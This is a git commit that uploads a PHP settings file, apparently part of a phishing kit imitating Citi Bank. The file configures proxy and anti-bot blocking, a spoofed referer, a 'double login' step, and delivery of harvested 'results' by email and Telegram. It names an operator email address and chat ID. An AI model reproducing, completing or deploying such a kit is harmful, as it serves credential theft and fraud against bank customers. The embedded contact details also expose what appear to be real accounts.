f42280d28d3823b7a0536cf23fdfbdaadddb0d7c
kingvenom69 <117453229+kingvenom69@users.noreply.github.com>
2022-11-05 06:35:53 -0700

    Add files via upload

---
+++ Citi Bank-2022 (1)/settings/settings.php
@@ -0,0 +1,21 @@
+<?php
+
+$settings = array(
+    
+    "proxy_block"	=> "1",	// Detect Proxies & Block Them
+	"send_mail"		=> "1",	// Send E-Mail 
+	"save_results"	=> "1",	// Save Results 
+	"telegram"		=> "1",
+	"double_login"	=> "1", // Double Login
+	"chat_id"		=> "-1001181474291",
+	"bot_url"		=> "",	// Your Bot API Key
+	"referer"		=> "https://live.com/",	// HTTP Referer For Antibots 
+	"out"			=> "citi+login",	// Outcome Of AntiBots Forward 
+	"email"			=> "jrountree07@yandex.com",	// Your E-Mail
+);
+return $settings;
+
+
+?>
+
+
